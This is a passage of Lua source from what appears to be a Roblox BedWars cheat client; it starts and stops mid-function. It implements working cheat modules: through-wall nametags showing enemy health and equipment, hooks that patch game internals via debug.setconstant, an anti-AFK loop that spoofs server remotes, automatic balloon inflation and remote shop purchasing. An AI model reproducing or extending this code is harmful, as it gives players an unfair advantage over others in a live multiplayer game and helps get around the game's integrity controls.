			thing.TextColor3 = getPlayerColor(plr.Player) or Color3.fromHSV(NameTagsColor.Hue, NameTagsColor.Sat, NameTagsColor.Value)
			thing.Parent = NameTagsFolder
			local hand = Instance.new("ImageLabel")
			hand.Size = UDim2.new(0, 30, 0, 30)
			hand.Name = "Hand"
			hand.BackgroundTransparency = 1
			hand.Position = UDim2.new(0, -30, 0, -30)
			hand.Image = ""
			hand.Parent = thing
			local helmet = hand:Clone()
			helmet.Name = "Helmet"
			helmet.Position = UDim2.new(0, 5, 0, -30)
			helmet.Parent = thing
			local chest = hand:Clone()
			chest.Name = "Chestplate"
			chest.Position = UDim2.new(0, 35, 0, -30)
			chest.Parent = thing
			local boots = hand:Clone()
			boots.Name = "Boots"
			boots.Position = UDim2.new(0, 65, 0, -30)
			boots.Parent = thing
			local kit = hand:Clone()
			kit.Name = "Kit"
			task.spawn(function()
				repeat task.wait() until plr.Player:GetAttribute("PlayingAsKit") ~= ""
				if kit then
					kit.Image = kititems[plr.Player:GetAttribute("PlayingAsKit")] and bedwars.getIcon({itemType = kititems[plr.Player:GetAttribute("PlayingAsKit")]}, NameTagsShowInventory.Enabled) or ""
				end
			end)
			kit.Position = UDim2.new(0, -30, 0, -65)
			kit.Parent = thing
			nametagsfolderdrawing[plr.Player] = {entity = plr, Main = thing}
		end,
		Drawing = function(plr)
			if NameTagsTeammates.Enabled and (not plr.Targetable) and (not plr.Friend) then return end
			local thing = {Main = {}, entity = plr}
			thing.Main.Text = Drawing.new("Text")
			thing.Main.Text.Size = 17 * (NameTagsScale.Value / 10)
			thing.Main.Text.Font = (math.clamp((table.find(fontitems, NameTagsFont.Value) or 1) - 1, 0, 3))
			thing.Main.Text.ZIndex = 2
			thing.Main.BG = Drawing.new("Square")
			thing.Main.BG.Filled = true
			thing.Main.BG.Transparency = 0.5
			thing.Main.BG.Visible = NameTagsBackground.Enabled
			thing.Main.BG.Color = Color3.new()
			thing.Main.BG.ZIndex = 1
			nametagstrs[plr.Player] = WhitelistFunctions:GetTag(plr.Player)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
			if NameTagsHealth.Enabled then
				local color = Color3.fromHSV(math.clamp(plr.Humanoid.Health / plr.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
				nametagstrs[plr.Player] = nametagstrs[plr.Player]..' '..math.round(plr.Humanoid.Health)
			end
			if NameTagsDistance.Enabled then 
				nametagstrs[plr.Player] = '[%s] '..nametagstrs[plr.Player]
			end
			thing.Main.Text.Text = nametagstrs[plr.Player]
			thing.Main.BG.Size = Vector2.new(thing.Main.Text.TextBounds.X + 4, thing.Main.Text.TextBounds.Y)
			thing.Main.Text.Color = getPlayerColor(plr.Player) or Color3.fromHSV(NameTagsColor.Hue, NameTagsColor.Sat, NameTagsColor.Value)
			nametagsfolderdrawing[plr.Player] = thing
		end
	}

	local nametagfuncs2 = {
		Normal = function(ent)
			local v = nametagsfolderdrawing[ent]
			nametagsfolderdrawing[ent] = nil
			if v then 
				v.Main:Destroy()
			end
		end,
		Drawing = function(ent)
			local v = nametagsfolderdrawing[ent]
			nametagsfolderdrawing[ent] = nil
			if v then 
				for i2,v2 in pairs(v.Main) do
					pcall(function() v2.Visible = false v2:Remove() end)
				end
			end
		end
	}

	local nametagupdatefuncs = {
		Normal = function(ent)
			local v = nametagsfolderdrawing[ent.Player]
			if v then 
				nametagstrs[ent.Player] = WhitelistFunctions:GetTag(ent.Player)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
				if NameTagsHealth.Enabled then
					local color = Color3.fromHSV(math.clamp(ent.Humanoid.Health / ent.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
					nametagstrs[ent.Player] = nametagstrs[ent.Player]..' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.round(ent.Humanoid.Health).."</font>"
				end
				if NameTagsDistance.Enabled then 
					nametagstrs[ent.Player] = '<font color="rgb(85, 255, 85)">[</font><font color="rgb(255, 255, 255)">%s</font><font color="rgb(85, 255, 85)">]</font> '..nametagstrs[ent.Player]
				end
				if NameTagsShowInventory.Enabled then 
					local inventory = bedwarsStore.inventories[ent.Player] or {armor = {}}
					if inventory.hand then
						v.Main.Hand.Image = bedwars.getIcon(inventory.hand, NameTagsShowInventory.Enabled)
						if v.Main.Hand.Image:find("rbxasset://") then
							v.Main.Hand.ResampleMode = Enum.ResamplerMode.Pixelated
						end
					else
						v.Main.Hand.Image = ""
					end
					if inventory.armor[4] then
						v.Main.Helmet.Image = bedwars.getIcon(inventory.armor[4], NameTagsShowInventory.Enabled)
						if v.Main.Helmet.Image:find("rbxasset://") then
							v.Main.Helmet.ResampleMode = Enum.ResamplerMode.Pixelated
						end
					else
						v.Main.Helmet.Image = ""
					end
					if inventory.armor[5] then
						v.Main.Chestplate.Image = bedwars.getIcon(inventory.armor[5], NameTagsShowInventory.Enabled)
						if v.Main.Chestplate.Image:find("rbxasset://") then
							v.Main.Chestplate.ResampleMode = Enum.ResamplerMode.Pixelated
						end
					else
						v.Main.Chestplate.Image = ""
					end
					if inventory.armor[6] then
						v.Main.Boots.Image = bedwars.getIcon(inventory.armor[6], NameTagsShowInventory.Enabled)
						if v.Main.Boots.Image:find("rbxasset://") then
							v.Main.Boots.ResampleMode = Enum.ResamplerMode.Pixelated
						end
					else
						v.Main.Boots.Image = ""
					end
				end
				local nametagSize = textService:GetTextSize(removeTags(nametagstrs[ent.Player]), v.Main.TextSize, v.Main.Font, Vector2.new(100000, 100000))
				v.Main.Size = UDim2.new(0, nametagSize.X + 4, 0, nametagSize.Y)
				v.Main.Text = nametagstrs[ent.Player]
			end
		end,
		Drawing = function(ent)
			local v = nametagsfolderdrawing[ent.Player]
			if v then 
				nametagstrs[ent.Player] = WhitelistFunctions:GetTag(ent.Player)..(NameTagsDisplayName.Enabled and ent.Player.DisplayName or ent.Player.Name)
				if NameTagsHealth.Enabled then
					nametagstrs[ent.Player] = nametagstrs[ent.Player]..' '..math.round(ent.Humanoid.Health)
				end
				if NameTagsDistance.Enabled then 
					nametagstrs[ent.Player] = '[%s] '..nametagstrs[ent.Player]
					v.Main.Text.Text = entityLibrary.isAlive and string.format(nametagstrs[ent.Player], math.floor((entityLibrary.character.HumanoidRootPart.Position - ent.RootPart.Position).Magnitude)) or nametagstrs[ent.Player]
				else
					v.Main.Text.Text = nametagstrs[ent.Player]
				end
				v.Main.BG.Size = Vector2.new(v.Main.Text.TextBounds.X + 4, v.Main.Text.TextBounds.Y)
				v.Main.Text.Color = getPlayerColor(ent.Player) or Color3.fromHSV(NameTagsColor.Hue, NameTagsColor.Sat, NameTagsColor.Value)
			end
		end
	}

	local nametagcolorfuncs = {
		Normal = function(hue, sat, value)
			local color = Color3.fromHSV(hue, sat, value)
			for i,v in pairs(nametagsfolderdrawing) do 
				v.Main.TextColor3 = getPlayerColor(v.entity.Player) or color
			end
		end,
		Drawing = function(hue, sat, value)
			local color = Color3.fromHSV(hue, sat, value)
			for i,v in pairs(nametagsfolderdrawing) do 
				v.Main.Text.Color = getPlayerColor(v.entity.Player) or color
			end
		end
	}

	local nametagloop = {
		Normal = function()
			for i,v in pairs(nametagsfolderdrawing) do 
				local headPos, headVis = worldtoscreenpoint((v.entity.RootPart:GetRenderCFrame() * CFrame.new(0, v.entity.Head.Size.Y + v.entity.RootPart.Size.Y, 0)).Position)
				if not headVis then 
					v.Main.Visible = false
					continue
				end
				local mag = entityLibrary.isAlive and math.floor((entityLibrary.character.HumanoidRootPart.Position - v.entity.RootPart.Position).Magnitude) or 0
				if NameTagsRangeLimit.Value ~= 0 and mag > NameTagsRangeLimit.Value then 
					v.Main.Visible = false
					continue
				end
				if NameTagsDistance.Enabled then
					local stringsize = tostring(mag):len()
					if nametagsizes[v.entity.Player] ~= stringsize then 
						local nametagSize = textService:GetTextSize(removeTags(string.format(nametagstrs[v.entity.Player], mag)), v.Main.TextSize, v.Main.Font, Vector2.new(100000, 100000))
						v.Main.Size = UDim2.new(0, nametagSize.X + 4, 0, nametagSize.Y)
					end
					nametagsizes[v.entity.Player] = stringsize
					v.Main.Text = string.format(nametagstrs[v.entity.Player], mag)
				end
				v.Main.Position = UDim2.new(0, headPos.X, 0, headPos.Y)
				v.Main.Visible = true
			end
		end,
		Drawing = function()
			for i,v in pairs(nametagsfolderdrawing) do 
				local headPos, headVis = worldtoscreenpoint((v.entity.RootPart:GetRenderCFrame() * CFrame.new(0, v.entity.Head.Size.Y + v.entity.RootPart.Size.Y, 0)).Position)
				if not headVis then 
					v.Main.Text.Visible = false
					v.Main.BG.Visible = false
					continue
				end
				local mag = entityLibrary.isAlive and math.floor((entityLibrary.character.HumanoidRootPart.Position - v.entity.RootPart.Position).Magnitude) or 0
				if NameTagsRangeLimit.Value ~= 0 and mag > NameTagsRangeLimit.Value then 
					v.Main.Text.Visible = false
					v.Main.BG.Visible = false
					continue
				end
				if NameTagsDistance.Enabled then
					local stringsize = tostring(mag):len()
					v.Main.Text.Text = string.format(nametagstrs[v.entity.Player], mag)
					if nametagsizes[v.entity.Player] ~= stringsize then 
						v.Main.BG.Size = Vector2.new(v.Main.Text.TextBounds.X + 4, v.Main.Text.TextBounds.Y)
					end
					nametagsizes[v.entity.Player] = stringsize
				end
				v.Main.BG.Position = Vector2.new(headPos.X - (v.Main.BG.Size.X / 2), (headPos.Y + v.Main.BG.Size.Y))
				v.Main.Text.Position = v.Main.BG.Position + Vector2.new(2, 0)
				v.Main.Text.Visible = true
				v.Main.BG.Visible = NameTagsBackground.Enabled
			end
		end
	}

	local methodused

	local NameTags = {Enabled = false}
	NameTags = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "NameTags", 
		Function = function(callback) 
			if callback then
				methodused = NameTagsDrawing.Enabled and "Drawing" or "Normal"
				if nametagfuncs2[methodused] then
					table.insert(NameTags.Connections, entityLibrary.entityRemovedEvent:Connect(nametagfuncs2[methodused]))
				end
				if nametagfuncs1[methodused] then
					local addfunc = nametagfuncs1[methodused]
					for i,v in pairs(entityLibrary.entityList) do 
						if nametagsfolderdrawing[v.Player] then nametagfuncs2[methodused](v.Player) end
						addfunc(v)
					end
					table.insert(NameTags.Connections, entityLibrary.entityAddedEvent:Connect(function(ent)
						if nametagsfolderdrawing[ent.Player] then nametagfuncs2[methodused](ent.Player) end
						addfunc(ent)
					end))
				end
				if nametagupdatefuncs[methodused] then
					table.insert(NameTags.Connections, entityLibrary.entityUpdatedEvent:Connect(nametagupdatefuncs[methodused]))
					for i,v in pairs(entityLibrary.entityList) do 
						nametagupdatefuncs[methodused](v)
					end
				end
				if nametagcolorfuncs[methodused] then 
					table.insert(NameTags.Connections, GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.FriendColorRefresh.Event:Connect(function()
						nametagcolorfuncs[methodused](NameTagsColor.Hue, NameTagsColor.Sat, NameTagsColor.Value)
					end))
				end
				if nametagloop[methodused] then 
					RunLoops:BindToRenderStep("NameTags", nametagloop[methodused])
				end
			else
				RunLoops:UnbindFromRenderStep("NameTags")
				if nametagfuncs2[methodused] then
					for i,v in pairs(nametagsfolderdrawing) do 
						nametagfuncs2[methodused](i)
					end
				end
			end
		end,
		HoverText = "Renders nametags on entities through walls."
	})
	for i,v in pairs(Enum.Font:GetEnumItems()) do 
		if v.Name ~= "SourceSans" then 
			table.insert(fontitems, v.Name)
		end
	end
	NameTagsFont = NameTags.CreateDropdown({
		Name = "Font",
		List = fontitems,
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
	})
	NameTagsColor = NameTags.CreateColorSlider({
		Name = "Player Color", 
		Function = function(hue, sat, val) 
			if NameTags.Enabled and nametagcolorfuncs[methodused] then 
				nametagcolorfuncs[methodused](hue, sat, val)
			end
		end
	})
	NameTagsScale = NameTags.CreateSlider({
		Name = "Scale",
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
		Default = 10,
		Min = 1,
		Max = 50
	})
	NameTagsRangeLimit = NameTags.CreateSlider({
		Name = "Range",
		Function = function() end,
		Min = 0,
		Max = 1000,
		Default = 0
	})
	NameTagsBackground = NameTags.CreateToggle({
		Name = "Background", 
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
		Default = true
	})
	NameTagsDisplayName = NameTags.CreateToggle({
		Name = "Use Display Name", 
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
		Default = true
	})
	NameTagsHealth = NameTags.CreateToggle({
		Name = "Health", 
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end
	})
	NameTagsDistance = NameTags.CreateToggle({
		Name = "Distance", 
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end
	})
	NameTagsShowInventory = NameTags.CreateToggle({
		Name = "Equipment",
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
		Default = true
	})
	NameTagsTeammates = NameTags.CreateToggle({
		Name = "Teammates", 
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
		Default = true
	})
	NameTagsDrawing = NameTags.CreateToggle({
		Name = "Drawing",
		Function = function() if NameTags.Enabled then NameTags.ToggleButton(false) NameTags.ToggleButton(false) end end,
	})
end)

runFunction(function()
	local nobobdepth = {Value = 8}
	local nobobhorizontal = {Value = 8}
	local nobobvertical = {Value = -2}
	local rotationx = {Value = 0}
	local rotationy = {Value = 0}
	local rotationz = {Value = 0}
	local oldc1
	local oldfunc
	local nobob = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "NoBob",
		Function = function(callback) 
			local viewmodel = gameCamera:FindFirstChild("Viewmodel")
			if viewmodel then
				if callback then
					oldfunc = bedwars.ViewmodelController.playAnimation
					bedwars.ViewmodelController.playAnimation = function(self, animid, details)
						if animid == bedwars.AnimationType.FP_WALK then
							return
						end
						return oldfunc(self, animid, details)
					end
					bedwars.ViewmodelController:setHeldItem(lplr.Character and lplr.Character:FindFirstChild("HandInvItem") and lplr.Character.HandInvItem.Value and lplr.Character.HandInvItem.Value:Clone())
					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(nobobdepth.Value / 10))
					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (nobobhorizontal.Value / 10))
					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_VERTICAL_OFFSET", (nobobvertical.Value / 10))
					oldc1 = viewmodel.RightHand.RightWrist.C1
					viewmodel.RightHand.RightWrist.C1 = oldc1 * CFrame.Angles(math.rad(rotationx.Value), math.rad(rotationy.Value), math.rad(rotationz.Value))
				else
					bedwars.ViewmodelController.playAnimation = oldfunc
					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", 0)
					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", 0)
					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_VERTICAL_OFFSET", 0)
					viewmodel.RightHand.RightWrist.C1 = oldc1
				end
			end
		end,
		HoverText = "Removes the ugly bobbing when you move and makes sword farther"
	})
	nobobdepth = nobob.CreateSlider({
		Name = "Depth",
		Min = 0,
		Max = 24,
		Default = 8,
		Function = function(val)
			if nobob.Enabled then
				lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(val / 10))
			end
		end
	})
	nobobhorizontal = nobob.CreateSlider({
		Name = "Horizontal",
		Min = 0,
		Max = 24,
		Default = 8,
		Function = function(val)
			if nobob.Enabled then
				lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (val / 10))
			end
		end
	})
	nobobvertical= nobob.CreateSlider({
		Name = "Vertical",
		Min = 0,
		Max = 24,
		Default = -2,
		Function = function(val)
			if nobob.Enabled then
				lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_VERTICAL_OFFSET", (val / 10))
			end
		end
	})
	rotationx = nobob.CreateSlider({
		Name = "RotX",
		Min = 0,
		Max = 360,
		Function = function(val)
			if nobob.Enabled then
				gameCamera.Viewmodel.RightHand.RightWrist.C1 = oldc1 * CFrame.Angles(math.rad(rotationx.Value), math.rad(rotationy.Value), math.rad(rotationz.Value))
			end
		end
	})
	rotationy = nobob.CreateSlider({
		Name = "RotY",
		Min = 0,
		Max = 360,
		Function = function(val)
			if nobob.Enabled then
				gameCamera.Viewmodel.RightHand.RightWrist.C1 = oldc1 * CFrame.Angles(math.rad(rotationx.Value), math.rad(rotationy.Value), math.rad(rotationz.Value))
			end
		end
	})
	rotationz = nobob.CreateSlider({
		Name = "RotZ",
		Min = 0,
		Max = 360,
		Function = function(val)
			if nobob.Enabled then
				gameCamera.Viewmodel.RightHand.RightWrist.C1 = oldc1 * CFrame.Angles(math.rad(rotationx.Value), math.rad(rotationy.Value), math.rad(rotationz.Value))
			end
		end
	})
end)

runFunction(function()
	local SongBeats = {Enabled = false}
	local SongBeatsList = {ObjectList = {}}
	local SongBeatsIntensity = {Value = 5}
	local SongTween
	local SongAudio

	local function PlaySong(arg)
		local args = arg:split(":")
		local song = isfile(args[1]) and getcustomasset(args[1]) or tonumber(args[1]) and "rbxassetid://"..args[1]
		if not song then 
			warningNotification("SongBeats", "missing music file "..args[1], 5)
			SongBeats.ToggleButton(false)
			return
		end
		local bpm = 1 / (args[2] / 60)
		SongAudio = Instance.new("Sound")
		SongAudio.SoundId = song
		SongAudio.Parent = workspace
		SongAudio:Play()
		repeat
			repeat task.wait() until SongAudio.IsLoaded or (not SongBeats.Enabled) 
			if (not SongBeats.Enabled) then break end
			local newfov = math.min(bedwars.FovController:getFOV() * (bedwars.SprintController.sprinting and 1.1 or 1), 120)
			gameCamera.FieldOfView = newfov - SongBeatsIntensity.Value
			if SongTween then SongTween:Cancel() end
			SongTween = game:GetService("TweenService"):Create(gameCamera, TweenInfo.new(0.2), {FieldOfView = newfov})
			SongTween:Play()
			task.wait(bpm)
		until (not SongBeats.Enabled) or SongAudio.IsPaused
	end

	SongBeats = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "SongBeats",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					if #SongBeatsList.ObjectList <= 0 then 
						warningNotification("SongBeats", "no songs", 5)
						SongBeats.ToggleButton(false)
						return
					end
					local lastChosen
					repeat
						local newSong
						repeat newSong = SongBeatsList.ObjectList[Random.new():NextInteger(1, #SongBeatsList.ObjectList)] task.wait() until newSong ~= lastChosen or #SongBeatsList.ObjectList <= 1
						lastChosen = newSong
						PlaySong(newSong)
						if not SongBeats.Enabled then break end
						task.wait(2)
					until (not SongBeats.Enabled)
				end)
			else
				if SongAudio then SongAudio:Destroy() end
				if SongTween then SongTween:Cancel() end
				gameCamera.FieldOfView = bedwars.FovController:getFOV() * (bedwars.SprintController.sprinting and 1.1 or 1)
			end
		end
	})
	SongBeatsList = SongBeats.CreateTextList({
		Name = "SongList",
		TempText = "songpath:bpm"
	})
	SongBeatsIntensity = SongBeats.CreateSlider({
		Name = "Intensity",
		Function = function() end,
		Min = 1,
		Max = 10,
		Default = 5
	})
end)

runFunction(function()
	local performed = false
	GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "UICleanup",
		Function = function(callback)
			if callback and not performed then 
				performed = true
				task.spawn(function()
					local hotbar = require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui["hotbar-app"]).HotbarApp
					local hotbaropeninv = require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui["hotbar-open-inventory"]).HotbarOpenInventory
					local topbarbutton = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out).TopBarButton
					local gametheme = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.shared.ui["game-theme"]).GameTheme
					bedwars.AppController:closeApp("TopBarApp")
					local oldrender = topbarbutton.render
					topbarbutton.render = function(self) 
						local res = oldrender(self)
						if not self.props.Text then
							return bedwars.Roact.createElement("TextButton", {Visible = false}, {})
						end
						return res
					end
					hotbaropeninv.render = function(self) 
						return bedwars.Roact.createElement("TextButton", {Visible = false}, {})
					end
					debug.setconstant(hotbar.render, 52, 0.9975)
					debug.setconstant(hotbar.render, 73, 100)
					debug.setconstant(hotbar.render, 89, 1)
					debug.setconstant(hotbar.render, 90, 0.04)
					debug.setconstant(hotbar.render, 91, -0.03)
					debug.setconstant(hotbar.render, 109, 1.35)
					debug.setconstant(hotbar.render, 110, 0)
					debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 30, 1)
					debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 31, 0.175)
					debug.setconstant(debug.getupvalue(hotbar.render, 11).render, 33, -0.101)
					debug.setconstant(debug.getupvalue(hotbar.render, 18).render, 71, 0)
					debug.setconstant(debug.getupvalue(hotbar.render, 18).tweenPosition, 16, 0)
					gametheme.topBarBGTransparency = 0.5
					bedwars.TopBarController:mountHud()
					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
					bedwars.AbilityUIController.abilityButtonsScreenGui.Visible = false
					bedwars.MatchEndScreenController.waitUntilDisplay = function() return false end
					task.spawn(function()
						repeat
							task.wait()
							local gui = lplr.PlayerGui:FindFirstChild("StatusEffectHudScreen")
							if gui then gui.Enabled = false break end
						until false
					end)
					task.spawn(function()
						repeat task.wait() until bedwarsStore.matchState ~= 0
						if bedwars.ClientStoreHandler:getState().Game.customMatch == nil then 
							debug.setconstant(bedwars.QueueCard.render, 9, 0.1)
						end
					end)
					local slot = bedwars.ClientStoreHandler:getState().Inventory.observedInventory.hotbarSlot
					bedwars.ClientStoreHandler:dispatch({
						type = "InventorySelectHotbarSlot",
						slot = slot + 1 % 8
					})
					bedwars.ClientStoreHandler:dispatch({
						type = "InventorySelectHotbarSlot",
						slot = slot
					})
				end)
			end
		end
	})
end)

runFunction(function()
	local AntiAFK = {Enabled = false}
	AntiAFK = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AntiAFK",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat 
						task.wait(5) 
						bedwars.ClientHandler:Get("AfkInfo"):SendToServer({
							afk = false
						})
					until (not AntiAFK.Enabled)
				end)
			end
		end
	})
end)

runFunction(function()
	local AutoBalloonPart
	local AutoBalloonConnection
	local AutoBalloonDelay = {Value = 10}
	local AutoBalloonLegit = {Enabled = false}
	local AutoBalloonypos = 0
	local balloondebounce = false
	local AutoBalloon = {Enabled = false}
	AutoBalloon = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoBalloon", 
		Function = function(callback)
			if callback then
				task.spawn(function()
					repeat task.wait() until bedwarsStore.matchState ~= 0 or  not vapeInjected
					if vapeInjected and AutoBalloonypos == 0 and AutoBalloon.Enabled then
						local lowestypos = 99999
						for i,v in pairs(bedwarsStore.blocks) do 
							local newray = workspace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							if i % 200 == 0 then 
								task.wait(0.06)
							end
							if newray and newray.Position.Y <= lowestypos then
								lowestypos = newray.Position.Y
							end
						end
						AutoBalloonypos = lowestypos - 8
					end
				end)
				task.spawn(function()
					repeat task.wait() until AutoBalloonypos ~= 0
					if AutoBalloon.Enabled then
						AutoBalloonPart = Instance.new("Part")
						AutoBalloonPart.CanCollide = false
						AutoBalloonPart.Size = Vector3.new(10000, 1, 10000)
						AutoBalloonPart.Anchored = true
						AutoBalloonPart.Transparency = 1
						AutoBalloonPart.Material = Enum.Material.Neon
						AutoBalloonPart.Color = Color3.fromRGB(135, 29, 139)
						AutoBalloonPart.Position = Vector3.new(0, AutoBalloonypos - 50, 0)
						AutoBalloonConnection = AutoBalloonPart.Touched:Connect(function(touchedpart)
							if entityLibrary.isAlive and touchedpart:IsDescendantOf(lplr.Character) and balloondebounce == false then
								autobankballoon = true
								balloondebounce = true
								local oldtool = bedwarsStore.localHand.tool
								for i = 1, 3 do
									if getItem("balloon") and (AutoBalloonLegit.Enabled and getHotbarSlot("balloon") or AutoBalloonLegit.Enabled == false) and (lplr.Character:GetAttribute("InflatedBalloons") and lplr.Character:GetAttribute("InflatedBalloons") < 3 or lplr.Character:GetAttribute("InflatedBalloons") == nil) then
										if AutoBalloonLegit.Enabled then
											if getHotbarSlot("balloon") then
												bedwars.ClientStoreHandler:dispatch({
													type = "InventorySelectHotbarSlot", 
													slot = getHotbarSlot("balloon")
												})
												task.wait(AutoBalloonDelay.Value / 100)
												bedwars.BalloonController:inflateBalloon()
											end
										else
											task.wait(AutoBalloonDelay.Value / 100)
											bedwars.BalloonController:inflateBalloon()
										end
									end
								end
								if AutoBalloonLegit.Enabled and oldtool and getHotbarSlot(oldtool.Name) then
									task.wait(0.2)
									bedwars.ClientStoreHandler:dispatch({
										type = "InventorySelectHotbarSlot", 
										slot = (getHotbarSlot(oldtool.Name) or 0)
									})
								end
								balloondebounce = false
								autobankballoon = false
							end
						end)
						AutoBalloonPart.Parent = workspace
					end
				end)
			else
				if AutoBalloonConnection then AutoBalloonConnection:Disconnect() end
				if AutoBalloonPart then
					AutoBalloonPart:Remove() 
				end
			end
		end, 
		HoverText = "Automatically Inflates Balloons"
	})
	AutoBalloonDelay = AutoBalloon.CreateSlider({
		Name = "Delay",
		Min = 1,
		Max = 50,
		Default = 20,
		Function = function() end,
		HoverText = "Delay to inflate balloons."
	})
	AutoBalloonLegit = AutoBalloon.CreateToggle({
		Name = "Legit Mode",
		Function = function() end,
		HoverText = "Switches to balloons in hotbar and inflates them."
	})
end)

local autobankapple = false
runFunction(function()
	local AutoBuy = {Enabled = false}
	local AutoBuyArmor = {Enabled = false}
	local AutoBuySword = {Enabled = false}
	local AutoBuyUpgrades = {Enabled = false}
	local AutoBuyGen = {Enabled = false}
	local AutoBuyProt = {Enabled = false}
	local AutoBuySharp = {Enabled = false}
	local AutoBuyDestruction = {Enabled = false}
	local AutoBuyDiamond = {Enabled = false}
	local AutoBuyAlarm = {Enabled = false}
	local AutoBuyGui = {Enabled = false}
	local AutoBuyTierSkip = {Enabled = true}
	local AutoBuyRange = {Value = 20}
	local AutoBuyCustom = {ObjectList = {}, RefreshList = function() end}
	local AutoBankUIToggle = {Enabled = false}
	local AutoBankDeath = {Enabled = false}
	local AutoBankStay = {Enabled = false}
	local buyingthing = false
	local shoothook
	local bedwarsshopnpcs = {}
	local id
	local armors = {
		[1] = "leather_chestplate",
		[2] = "iron_chestplate",
		[3] = "diamond_chestplate",
		[4] = "emerald_chestplate"
	}

	local swords = {
		[1] = "wood_sword",
		[2] = "stone_sword",
		[3] = "iron_sword",
		[4] = "diamond_sword",
		[5] = "emerald_sword"
	}

	local axes = {
		[1] = "wood_axe",
		[2] = "stone_axe",
		[3] = "iron_axe",
		[4] = "diamond_axe"
	}

	local pickaxes = {
		[1] = "wood_pickaxe",
		[2] = "stone_pickaxe",
		[3] = "iron_pickaxe",
		[4] = "diamond_pickaxe"
	}

	task.spawn(function()
		repeat task.wait() until bedwarsStore.matchState ~= 0 or not vapeInjected
		for i,v in pairs(collectionService:GetTagged("BedwarsItemShop")) do
			table.insert(bedwarsshopnpcs, {Position = v.Position, TeamUpgradeNPC = true, Id = v.Name})
		end
		for i,v in pairs(collectionService:GetTagged("BedwarsTeamUpgrader")) do
			table.insert(bedwarsshopnpcs, {Position = v.Position, TeamUpgradeNPC = false, Id = v.Name})
		end
	end)

	local function nearNPC(range)
		local npc, npccheck, enchant, newid = nil, false, false, nil
		if entityLibrary.isAlive then
			local enchanttab = {}
			for i,v in pairs(collectionService:GetTagged("broken-enchant-table")) do 
				table.insert(enchanttab, v)
			end
			for i,v in pairs(collectionService:GetTagged("enchant-table")) do 
				table.insert(enchanttab, v)
			end
			for i,v in pairs(enchanttab) do 
				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= 6 then
					if ((not v:GetAttribute("Team")) or v:GetAttribute("Team") == lplr:GetAttribute("Team")) then
						npc, npccheck, enchant = true, true, true
					end
				end
			end
			for i, v in pairs(bedwarsshopnpcs) do
				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= (range or 20) then
					npc, npccheck, enchant = true, (v.TeamUpgradeNPC or npccheck), false
					newid = v.TeamUpgradeNPC and v.Id or newid
				end
			end
			local suc, res = pcall(function() return lplr.leaderstats.Bed.Value == "✅"  end)
			if AutoBankDeath.Enabled and (workspace:GetServerTimeNow() - lplr.Character:GetAttribute("LastDamageTakenTime")) < 2 and suc and res then 
				return nil, false, false
			end
			if AutoBankStay.Enabled then 
				return nil, false, false
			end
		end
		return npc, not npccheck, enchant, newid
	end

	local function buyItem(itemtab, waitdelay)
		if not id then return end
		local res
		bedwars.ClientHandler:Get("BedwarsPurchaseItem"):CallServerAsync({
			shopItem = itemtab,
			shopId = id
